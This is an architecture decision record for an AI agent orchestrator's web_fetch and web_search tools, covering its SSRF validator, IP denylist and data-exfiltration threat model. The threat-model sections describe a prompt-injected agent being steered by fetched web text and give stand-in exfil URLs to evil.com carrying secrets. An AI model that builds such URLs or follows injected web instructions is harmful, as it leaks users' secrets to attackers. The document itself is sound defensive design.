# ADR-035: Network local tools — execution posture, SSRF/exfil threat model, honest egress residual

**Status:** Proposed — drafted 2026-06-05 (senior, for P4.2-B4). Architect Peidong Accepts after the plan-stage review (R0-A-on-plan + the mandatory dual-lens R0-B-on-plan) clears and the routed findings are absorbed (RC-23: stays `Proposed` until the architect Accepts). The ADR-028 D3 amendment + the ADR-031 D1a annotation are inscribed at impl (plan task B4-7), matching this Status. Impl-stage dual-lens R0-B (`requires_cross_family_review: true`) re-probes the SSRF/exfil trust boundary + liveness on the implementation.

**Scope:** The network execution posture, four-sub-surface SSRF/exfil threat model, the **app-level SSRF validator floor**, the **honest egress residual** (the active network half of `RB-FS/NET`), and the executor placement for the two deferred **network** local tools — `web_fetch` (an agent-chosen URL) and `web_search` (a fixed-provider query) — shipped **before** the P4.3 egress sandbox. Amends ADR-028 D3 (these two no-longer-deferred); annotates ADR-031 D1a (the network half is now the *active* surface). Does NOT govern: the autonomy gate (unchanged, ADR-027 D2); the P4.3 egress/syscall sandbox (the retirement path); the operator egress-allowlist (named tightening knob, not built here).

---

## Context

P4.1 (ADR-033) closed the in-turn investigation loop; P4.2-B3 (ADR-034) gave it **subprocess** reach (run tests/lint, read git history). But every tool the agent can chain still touches only the **local disk** — it cannot pull the doc a stack trace references, check whether an upstream bug is fixed, or look up an unfamiliar API. The flagship bug-fix / code-review loop's open-web step (P4-roadmap §7) has nothing network-shaped to call. ADR-028 D3 deferred the two web tools as *"a network trust surface … each distinct surface warrants its own slice + classification review."* This is that slice.

`web_fetch` is the project's **first tool where the URL is agent-chosen** (LLM-proposed, prompt-injection-influenceable) — not operator-configured. Every prior network fetch targets an **operator-authoritative** URL with bounded-timeout/`verify=True` but **no SSRF guard** (`mcp/transport.py:110-128`, `plugins/fetch.py:233`, `llm/providers/openai_compatible.py:107`) — there is **none to reuse**. So B4 is mostly **inscribing the network posture + building the one app-level SSRF validator** that makes "let the agent reach the web, before the egress sandbox exists" an *Accepted boundary* rather than an open door.

The load-bearing tension is **sharper than B3's**: B3's network residual was *latent* (pytest/git don't intend to egress); **B4's egress IS the tool's function**, and the URL is **agent-chosen** — so the SSRF guard is the *only* thing standing between a prompt-injected agent and the internal network, and it is **new security code with a notorious failure history** (DNS rebinding, IP-literal encodings, IPv6, redirects, credential-on-redirect). B4 must run the fetch in-process with an **app-level SSRF posture** that neutralises the internal-reach + credential-leak + liveness risks, while **honestly Accepting** that data-exfil to a *public* attacker URL is **not** prevented without the P4.3 egress firewall — the **active** network half of the already-Accepted `RB-FS/NET` (ADR-031 D1a).

---

## ⭐⭐ Constitutional carry-forward (NON-NEGOTIABLE — inscribed, not decided; per P4-roadmap §10)

The senior inscribes; the impl enforces; R0-A/R0-B probe each.

1. **Execution stays DOWNSTREAM of the gate (ADR-028 #1 / t4).** Web tools route the **unchanged** `process_tool_calls` → `emit_gate_decision` path; AUTO (rev 10) executes; any `COUNTDOWN`/`HARD` variant appends `TOOL_CALL_PENDING` (no `TOOL_CALL`) → **not executed in-loop** (confirm-then-execute out-of-band, ADR-033 carry-forward #3). The executor never re-gates.
2. **No LLM judgment in the executor; no new `LLMPurpose` (t2/t3).** The network path is pure code; **the SSRF decision is code, never an LLM judgment** ("is this URL safe" is never an LLM call). Web output is **not** interpreted (D3-iii) — so no `LLMPurpose` is consumed on this path at all.
3. **The network trust boundary is REAL for SSRF/credential/liveness, HONEST about egress.** App-level scheme allowlist + IP-range floor + DNS-rebind resolve-then-pin + redirect re-validation (no internal-service/metadata reach), credential-stripped anonymous requests (no secret/cookie/auth leak — the c2 lesson at network scale), bounded size + timeout + per-turn cap (the ADR-028 D5 bound) — **but NOT a syscall/egress firewall**: the **network half of `RB-FS/NET`**, Accepted **exactly as ADR-031 D1a / ADR-034 D2 modelled it**, retired by P4.3.
4. **Reuse, don't rebuild — one network mechanism.** Reuse `httpx` + the bounded-timeout/`verify=True` patterns, the executor cap structure, and the `_external_output_tool_result_call_ids` filter. **The SSRF validator is the one genuinely new primitive** — built **once**, in **one** place (`tools/net_trust.py`), consumed by `web_fetch` and any future agent-URL tool; URL checks are **not** scattered.
5. **`tools/` stays a downstream leaf (t1); `_execute_local_call` stays byte-unchanged** (empty-executor-diff): the per-turn network cap lives in the `execute_pending_tool_calls` **loop** (mirroring B3's subprocess branch), not in the byte-frozen dispatch fn.
6. **URL-validated, never blind-fetch — test-enforced.** No code path fetches an agent-supplied URL without the SSRF validator; a **constitution test (`t10`) asserts** private/link-local/loopback/cloud-metadata/`0.0.0.0` ranges are rejected **and** that the fetch path cannot bypass the validator (no `verify=False`, no non-validating client) — the ADR-034 `t9` / ADR-032 `verify=False` precedent applied to SSRF.

---

## Decisions

### D1 — Ship both network tools; classifications stand

Both ship in B4: `web_fetch` (`tools.yaml:15-16`, reversibility 10 → AUTO) and `web_search` (`tools.yaml:13-14`, reversibility 10 → AUTO). At any agent with `threshold_auto ≤ 10` both reach `AUTO_EXECUTE`. The classifications are **confirmed as-is** (ADR-028 D3 amendment below).

**They are two DIFFERENT trust surfaces, both shipped:**
- **`web_fetch` = fetch an arbitrary, *agent-chosen* URL → the SSRF / data-exfil CORE.** No provider key; direct `httpx` through the SSRF-validating transport; the whole posture work (D2/D3) exists for this tool.
- **`web_search` = a query through a *fixed provider* API** (operator-configured endpoint). The egress target is a single operator-configured endpoint (**SSRF N/A**) — but it adds a **provider-API-key dependency** (a credential surface + a new config secret) and its *results* are still untrusted external text (D3-iii). The provider choice is an architect call (plan §5-1); the config mechanism follows the existing `api_key_env` pattern (`llm/types.py:248`).

**Why both now:** value-first sequencing (P4-roadmap §7); `web_search` reuses **none** of the SSRF validator, so it is near-independent additive work once the provider is set; the marginal posture cost is ~nil.

**The ratified-AUTO tier + its tightening knobs.** Both are AUTO (ratified). The **conservative knob** for `web_fetch` — re-classify → `COUNTDOWN` so every agent-proposed URL is confirm-gated — is **named, not taken** in B4; together with the **operator egress-allowlist** (D2) it is the documented human-in-the-loop / deployment-tightening path for the egress residual.

### D2 — Execution posture: app-level SSRF floor now + the honest egress residual (THE load-bearing call)

`web_fetch` runs **in-process** as an `httpx` `LocalToolFn` with an **SSRF-validating resolve-then-pin transport** — **not** a subprocess. (A `curl` subprocess would re-introduce the SSRF surface inside the child and add a fork for no isolation gain; a subprocess is **not** a network namespace — that is P4.3.) The posture floor (the **non-negotiable** denylist — classify the **resolved** IP via `ipaddress`, never the raw host string):

- **Scheme allowlist:** `http` **and** `https` only; reject `file://`/`gopher://`/`ftp://`/`data://`/… **before** resolving. (The IP floor already blocks `http`-to-internal; `http` to public hosts is common and permitted.)
- **IP-range denylist floor:** reject **loopback** (`127.0.0.0/8`, `::1`), **private** (`10/8`, `172.16/12`, `192.168/16`, `fc00::/7`), **link-local** (`169.254.0.0/16`, `fe80::/10` — **incl. cloud-metadata `169.254.169.254`**), **unspecified** (`0.0.0.0`, `::`), and (belt-and-suspenders) **multicast/reserved**. **IPv4-mapped IPv6** (`::ffff:127.0.0.1`) is unwrapped and re-classified. **Deny if ANY** resolved address is denied.
- **DNS-rebind defense — resolve-then-pin:** resolve the host **once**, validate **all** resolved IPs, **connect to a pinned validated IP** (no re-resolve at connect) — so a TOCTOU/rebind between check and connect cannot slip an internal IP through. TLS uses the original **hostname** for SNI/cert verification (`verify=True`) while the **pinned IP** is the connection target.
- **Redirect re-validation:** redirects followed with a bounded `max_redirects` (5); **every** hop re-runs the full scheme + resolve-then-pin check (a `302 → http://169.254.169.254` is re-rejected).
- **Credential-stripped anonymous client:** **no** `Authorization`, **no** cookies, **no** orchestrator env / api-key / secret; a cross-origin redirect cannot forward auth (none is sent). `verify=True` always.
- **Bounded response size + timeout + per-turn cap:** the body is read **as it streams**, stopping at `MAX_RESULT_BYTES` (64 KiB, reused) — **never** buffering an unbounded response into the single writer (the ADR-028 D3 / B3 R0-A Y1 OOM lesson, network scale); a bounded `httpx.Timeout`; and the per-turn **network** cap (D4).

**The honest residual (`RB-FS/NET`-class, network half, now ACTIVE).** Even with the floor, **without a real egress firewall (P4.3)** there remain: **(i) data-exfil to a *public* attacker URL** (`https://evil.com/?d=<secret>` — the IP floor permits public hosts, the URL is agent-chosen); **(ii)** exotic resolver/rebind/`CNAME` edges; **(iii)** any range the denylist misses. This is the **network half of `RB-FS/NET`** (ADR-031 D1a), Accepted **exactly as ADR-031 D1a / ADR-034 D2 modelled it** — Accept the *real* surface, not a softened one. **The distinction from B3:** B3's network residual was *latent* (subprocess tools don't intend to egress); **B4's is *active*** — egress is the tool's function and the URL is agent-chosen, so this residual is the sharpest yet. **We do NOT claim data-exfil is solved.** The mitigations that **shrink the injection vector** that induces exfil — output-untrusted framing + excerpt-exclusion (D3-iii) — are real but partial; **full** prevention needs the P4.3 egress firewall or an **operator egress allowlist** (fetch only approved hosts — the named opt-in tightening, too restrictive as a default for general `web_fetch`).

**Forward-watch (one residual, one retirement path).** P4.3 builds the real egress/syscall sandbox. B4's `web_fetch` egresses through the app-level validator that P4.3 will **wrap** (network-namespace the process) — so P4.3 retires **this** residual together with the ADR-031 D1a / ADR-034 D2 `RB-FS/NET` residuals, on **one** path. The app-level validator does **not** reverse when the sandbox lands (defense-in-depth: the metadata-range block is wanted regardless); the sandbox **wraps** it.

**Considered + rejected — Option B (reorder B4 behind P4.3):** build the egress sandbox first; `web_fetch` network-namespaced from day one (thinner app residual). Rejected: blocks the web capability on the heaviest infra slice; inverts value-first sequencing (§7); the app-level validator is **still wanted** post-sandbox (defense-in-depth + metadata-range blocking); the residual is an **Accepted-and-gated class** (ADR-031 D1a, twice-Accepted), not a new risk.

### D3 — Threat model: four sub-surfaces

**(i) SSRF (internal-service / metadata reach) → the validator floor (D2).** The untrusted input is the **LLM-proposed URL**; the defense is scheme allowlist + resolve-then-pin + IP-range/redirect validation. The senior pins the exact range list + the redirect/scheme policy (D2); R0-B probes completeness against the **standard SSRF-bypass checklist** (IP-literal encodings — octal/hex/decimal; IPv6 + IPv4-mapped; DNS-rebind; redirect; credential-on-redirect). **Test-enforced** (`t10`, carry-forward #6).

**(ii) Data-exfil (stolen data encoded in an agent-fetched URL) → the sharper, partially-residual threat.** A prompt-injected agent fetching `https://evil.com/?leak=<secret>` egresses to a **public** host the IP-floor permits. **Mitigations:** the output-untrusted framing + excerpt-exclusion (D3-iii) shrink the *injection* vector that induces it; **full** prevention needs an operator egress allowlist (opt-in tightening) or the P4.3 egress firewall. **Inscribed honestly: app-guards + framing now; the public-host-exfil residual is Accepted, not solved** (D2); the egress-allowlist is the operator knob; P4.3 is the retirement.

**(iii) Output-as-untrusted — fetched web content is the MOST untrusted output yet (extends ADR-034 D3-iv).** Open-web bytes are attacker-authorable by definition. Treat exactly like the B3 third trust class: **raw `TOOL_RESULT` + untrusted framing, NOT interpret→`OBSERVATION`** (the agent acts on the precise bytes; an interpret costs an LLM call in the D5 block + a lossy summary; and no new `LLMPurpose`). **The forced reconcile: widen `_external_output_tool_result_call_ids` to the web tools** — a `_NETWORK_TOOL_NAMES` frozenset beside `_SUBPROCESS_TOOL_NAMES` (`selection.py:95`), keyed on the `TOOL_CALL`'s `tool_name`, so injected web text **cannot steer a re-dispatched agent** via `snapshot_excerpt`. The drift-sync test (registry keys == name set) carries over (`t10`/sync-test).

- **Why excluding from the excerpt does not blind the acting agent (single-call case).** Identical to ADR-034 D3-iv: the re-dispatch loop (`api/app.py:454`) passes the **last** result-class event of a pass as the next pass's **`current_event`** — a channel **distinct** from the system-block `snapshot_excerpt`. When the agent issues `web_fetch` as its **focused/last** call (the dominant flagship shape), its bytes survive as `current_event`; the exclusion only removes them from the **cross-agent system-block steering surface** (the dangerous injection vector).
- **Known limitation — batched-non-last web results are invisible to the next pass (accepted MVP edge, inscribed not discovered).** The **same** edge as ADR-034 D3-iv: a web `TOOL_RESULT` reaches the next pass through **exactly one** channel (`current_event`), because it is excerpt-excluded **and** has no `OBSERVATION` proxy (raw-not-interpret). When a pass emits multiple result-class events and the web result is **not last**, it appears in neither channel. **Accepted for the MVP** (dominant single-call loop works; asymmetric with MCP, whose `OBSERVATION` survives in the excerpt); retirement is the same additive deferral as ADR-034 D3-iv — no posture change.

**(iv) Credential-safety (no secret/cookie/auth leak).** `web_fetch` requests carry **no `Authorization`, no cookies, no orchestrator env/api-key** — a stripped, anonymous client (D2; the c2 env-leak lesson, network analog); a cross-origin redirect cannot forward auth (none is sent). `web_search`'s **provider key** goes **only** to the fixed provider endpoint (the provider's auth header), **never** onto a fetched URL, never logged. *Inscribed; the senior pins the stripped-client behaviour (plan B4-1/B4-3).* 

**Plus the liveness terms (inscribed, not chosen):** bounded streamed output, bounded timeout, per-turn network cap (D2/D4) — each a finite term in the ADR-028 D5 single-writer bound, multiplied by the turn-loop's `(1+N)` passes (ADR-033 D4).

### D4 — Executor placement: in-process `LocalToolFn` + a per-turn NETWORK cap in the loop (empty-executor-diff)

Each web tool is a **non-`mcp__` local-registry entry** whose `LocalToolFn` runs in-process and is marked `_is_network_tool = True`. The executor adds a **per-turn network cap** — a counted branch in the `execute_pending_tool_calls` **loop**, **mirroring** the B3 subprocess branch (`executor.py:161-207`) and **separate** from it (network connections and subprocess forks are distinct resource classes — see plan §5-2): `MAX_NETWORK_CALLS_PER_TURN = 10`, excess → `TOOL_FAILED(turn_network_cap_exceeded)`. **No executor-decision edit** (ADR-031 HR#2 / ADR-028 D6 empty-executor-diff; t3b): `_execute_local_call` is **byte-frozen**; the cap is mechanism in the loop. **Enforcement is per-pass**; the true per-turn bound is `MAX_NETWORK_CALLS_PER_TURN × (1 + N)` passes (the ADR-033 D4 turn-loop multiplier, consistent with ADR-034 D5). The bound is finite, not a safety hole.

**Why in-process, not subprocess (unlike B3).** Resolve-then-pin (D2) is cleanest **in-process** — a custom `httpx` transport that validates the resolved IP and connects to it. A subprocess buys no isolation (it is not a network namespace — that is P4.3) and would re-introduce the SSRF surface inside the child. So B4 does **not** need the B3 Posture-B/subprocess path; it adds its own marker + cap.

**Result semantics (ride `_execute_local_call` unchanged):** a successful fetch/search at **any** HTTP status → `LocalToolOutput` → `TOOL_RESULT` (a `404`/`500` is *expected output the agent must see*, not a tool failure); SSRF-blocked / scheme-rejected / DNS-failure / timeout / over-`max_redirects` / over-cap-provider-error → the impl raises → `TOOL_FAILED`, with the **error class encoded in the message** (`ssrf_blocked:` / `scheme_rejected:` / `network_timeout:` / `fetch_failed:` / `search_provider_error:` / `web_search not configured`) because `_execute_local_call` is byte-frozen (the structured `error_class` stays the shared default; the agent distinguishes via the message prefix — exactly as ADR-034 D5).

**Carry-forward confirmation:** t1 (`tools/` leaf), t2 (no autonomy decision — the SSRF check is code), t3 (no new `LLMPurpose`), t4 (execute-on-`TOOL_CALL`-only) all hold; the gate stays the sole chokepoint, downstream.

---

## Considered alternatives

- **A new explicit network branch separate from the local path entirely** — unnecessary; the `_is_network_tool` marker + a cap branch in the existing loop (parallel to subprocess) suffices and keeps `_execute_local_call` byte-frozen.
- **Generalise the subprocess cap into one shared "external call" budget** — rejected (plan §5-2): network connections and subprocess forks are distinct resource classes with distinct bounds; one counter blurs each and changes B3's ratified semantics.
- **`web_fetch` as a `curl`/subprocess tool (reuse B3's posture)** — rejected (D4): a subprocess is not a network namespace (no isolation gain) and would re-introduce SSRF inside the child; resolve-then-pin is cleanest in-process.
- **Interpret web output → `OBSERVATION` (symmetric with MCP)** — rejected (D3-iii): costs an LLM call per fetch + a lossy summary the agent often can't act on; the precise bytes are the value; web content is the *most* untrusted output, least suited to a trusting interpret.
- **An `external_output` flag on `ToolResultMeta`** — rejected: the flag would be written by the byte-frozen `_execute_local_call` (empty-executor-diff); keying the excerpt exclusion on the `TOOL_CALL`'s `tool_name` (as `mcp__`/subprocess already do) needs no executor change; a drift sync-test neutralises the name-list's weakness.
- **Reorder B4 behind P4.3 (Option B)** — rejected (D2): blocks the capability on the heaviest infra slice; the app validator is wanted regardless; the residual is an Accepted class.
- **Operator egress allowlist as the default** — deferred to an opt-in knob (D2): too restrictive for general `web_fetch`; named as the deployment-tightening + P4.3 as the retirement.

---

## Consequences

**Easier:** the flagship loop can reach the open web (fetch a referenced doc, search an error string) mid-investigation; the SSRF validator + the network-tool machinery exist for any future agent-URL tool; one residual on one P4.3 retirement path.

**Harder:** a real **agent-chosen-URL outbound-network** surface now exists at runtime — the **active** network half of `RB-FS/NET` — until P4.3; the SSRF validator is new security code with a notorious bypass history (DNS-rebind/IP-encodings/IPv6/redirects) that the dual-lens R0-B must probe against the standard checklist; the single-writer block grows by the network time × `(1+N)` passes (bounded by the cap + timeout); the excerpt-exclusion name-list must stay in sync with the network registry (guarded by a sync-test); `web_search` adds an operator config + a provider secret.

**Neutral:** classifications unchanged (rev 10 stands); no new `EventType`, no new `LLMPurpose`; `_execute_local_call` byte-unchanged; the subprocess cap + B3 surface byte-unchanged.

---

## Reversibility

| Change | Cost to reverse / evolve |
|---|---|
| The two tools (registry entries + closures) | **Low** — additive; removing an entry returns it to fail-closed `not_implemented`. |
| `tools/net_trust.py` (SSRF validator + resolve-then-pin transport + anon client) | **Low–Med** — the one new network-trust primitive; reused by any future agent-URL tool. Tightenable (add a port allowlist / an operator egress allowlist) without a design change. |
| `tools/network_tools.py` (closures + `_NetworkToolFn` marker + registry) | **Low** — additive new module; `local.py` untouched (t6-pristine). |
| `MAX_NETWORK_CALLS_PER_TURN` (separate cap) + `_is_network_tool` marker | **Low** — mechanical; a counted branch in `execute_pending_tool_calls` parallel to the subprocess branch; `_execute_local_call` byte-frozen. |
| Per-tool timeouts (`WEB_FETCH_TIMEOUT_S=20s`, `WEB_SEARCH_TIMEOUT_S=15s`) + the `max_redirects=5` bound | **Low** — tunable constants; changing them moves the single-writer-block term, not the posture. |
| Response cap (`MAX_RESULT_BYTES`, 64 KiB) | **Low** — reused for all tool outputs (graceful truncation + `output_truncated_at`); tunable later. |
| `web_search` provider (config + parsing) | **Low–Med** — one operator-routed provider for the MVP (plan §5-1); a config-driven multi-provider/fallback is additive later; the key follows the `api_key_env` secret pattern. |
| **D2 `RB-FS/NET` (network half, active) residual → P4.3 egress sandbox** | **Additive (forward-watch)** — B4 delivers SSRF/credential/liveness defense; **real egress sandboxing is DEFERRED to P4.3**, which **wraps** `web_fetch`'s egress. Retired together with the ADR-031 D1a / ADR-034 D2 residuals on one path; the app validator does not reverse (defense-in-depth). The opt-in operator egress-allowlist + the `web_fetch → COUNTDOWN` re-tier are the interim deployment-tightening knobs. |

---

## References

- ADR-028 D2 (trust binary), D3 (network deferral, "a network trust surface"), D5 (single-writer liveness bound), D6 (empty-executor-diff) — **D3 amended by this ADR**.
- ADR-031 D1a (`RB-FS/NET` honest residual — env/secret/DoS only, FS/network deferred P4), HR#2 (empty-executor-diff) — **D1a annotated by this ADR (the network half is now the *active* surface)**.
- ADR-034 D2 (lighter-inline + honest residual, twice-Accepted `RB-FS/NET`), D3-iv (output-as-untrusted: raw, framed, excerpt-excluded; the two-channel `current_event` argument + the batched-non-last known-limitation), D5 (Posture-B cap path + empty-executor-diff + error-class-in-message).
- ADR-033 D4 (turn-loop `(1+N)` multiplier), D6 / R2-N1 (`snapshot_excerpt` untrusted-framing + the exclusion filter).
- ADR-032 D2/D3 (`httpx` `verify=True`, bounded timeout, fail-closed; the constitution-test-forbids-`verify=False` precedent → applied to SSRF-bypass).
- P4-roadmap §7 (flagship loop / value-first), §8 (heavy-set mandatory dual-lens), §10 (constitutional spine, honest-residual inscription).
- `src/orchestrator/tools/executor.py:51,115,161-207` (subprocess cap path the network branch mirrors), `mcp/transport.py:110-128` + `plugins/fetch.py:233` (existing `verify=True` httpx over operator-trusted URLs — no SSRF), `agents/selection.py:95-129` (excerpt exclusion), `api/app.py:236-240,454` (composition root + the `current_event` channel), `llm/types.py:248` + `openai_compatible.py:101-102` (the `api_key_env` pattern web_search follows).
